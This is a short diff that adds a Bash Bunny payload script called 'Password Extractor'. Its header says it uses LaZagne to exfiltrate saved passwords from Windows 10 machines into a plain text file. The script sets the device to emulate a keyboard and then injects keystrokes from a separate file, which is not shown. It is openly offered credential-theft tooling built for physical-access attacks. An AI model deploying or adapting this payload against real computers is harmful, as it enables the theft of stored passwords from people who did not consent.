@@ -1,0 +1,24 @@
+#Title: Password Extractor (SIMPLE[PROTOTYPE])
+#Description: Uses the LaZagne program to exfil passwords and copy them to a plain text file
+#Author Waffles
+#Props: Hak5Darren, more
+#Version: 0.1
+#Category: Credentials
+#Target: Windows 10
+#Attackmodes: ATTACKMODE HID RNDIS_ETHERNET VID_0x0b05 PID_0x7774
+
+#Setup the attackmode and language
+LED SETUP
+ATTACKMODE HID 
+
+#Options
+DUCKY_LANG us
+
+#Attack
+LED ATTACK
+QUACK payloads\switch1\pswrs.txt
+
+#Finish
+LED FINISH
+
+
